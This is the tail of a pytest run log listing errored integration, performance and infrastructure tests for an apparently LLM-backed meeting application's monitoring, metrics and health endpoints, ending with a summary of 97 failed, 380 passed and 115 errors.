ERROR tests/integration/test_monitoring_endpoints.py::TestHealthEndpoints::test_health_check_with_migration_status
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_success
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_empty
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_with_timeframe
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_error_summary_invalid_timeframe
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_monitoring_health_success
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_get_monitoring_health_degraded
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_record_error_endpoint
ERROR tests/integration/test_monitoring_endpoints.py::TestErrorMonitoringEndpoints::test_record_error_endpoint_invalid_data
ERROR tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_get_system_metrics_success
ERROR tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_get_application_metrics_success
ERROR tests/integration/test_monitoring_endpoints.py::TestMetricsEndpoints::test_prometheus_metrics_endpoint
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_monitoring_endpoints_require_admin
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_monitoring_endpoints_allow_admin
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_health_endpoint_public_access
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringAuthentication::test_prometheus_metrics_public_access
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_error_summary_service_failure
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_metrics_collection_failure
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringErrorScenarios::test_health_check_partial_failure
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_monitoring_endpoints_response_time
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_concurrent_monitoring_requests
ERROR tests/integration/test_monitoring_endpoints.py::TestMonitoringPerformance::test_large_error_summary_handling
ERROR tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_agenda_creation_performance
ERROR tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_decision_support_performance
ERROR tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_minutes_generation_performance
ERROR tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_concurrent_tool_execution
ERROR tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_tools_memory_efficiency
ERROR tests/performance/test_ai_operations_performance.py::TestMeetingToolsPerformance::test_tool_response_time_consistency
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_health_endpoint_response_time
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_auth_endpoint_performance
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_boardroom_creation_performance
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_concurrent_health_checks
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[5]
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[10]
ERROR tests/performance/test_performance.py::TestAPIPerformance::test_monitoring_endpoint_scalability[20]
ERROR tests/performance/test_performance.py::TestLoadTesting::test_sustained_health_check_load
ERROR tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[5]
ERROR tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[10]
ERROR tests/performance/test_performance.py::TestLoadTesting::test_batch_request_performance[20]
ERROR tests/test_infrastructure.py::test_database_session_fixture
ERROR tests/test_infrastructure.py::test_async_client_fixture
ERROR tests/test_infrastructure.py::test_health_check_endpoint
ERROR tests/test_infrastructure.py::test_root_endpoint
ERROR tests/test_infrastructure.py::test_mock_langfuse_fixture
ERROR tests/test_infrastructure.py::test_mock_llm_service_fixture
===== 97 failed, 380 passed, 227 warnings, 115 errors in 106.20s (0:01:46) =====
